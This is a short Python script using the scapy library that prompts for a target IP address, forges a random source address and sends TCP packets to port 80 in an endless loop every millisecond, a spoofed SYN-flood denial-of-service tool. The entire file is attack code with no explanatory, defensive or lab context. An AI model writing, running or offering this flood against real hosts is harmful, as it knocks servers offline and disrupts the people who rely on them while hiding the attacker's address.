from scapy.all import *
import socket
import struct
import random

sourceIP = str(socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))) #Because random

target = raw_input("Enter the objetive IP ")


IP = IP(src = sourceIP, dst = target)

while True:  
    TCP_v = TCP(sport = random.randint(1024,65535), dport = 80)
    packet = IP/TCP_v
    send(packet, inter = 0.001)



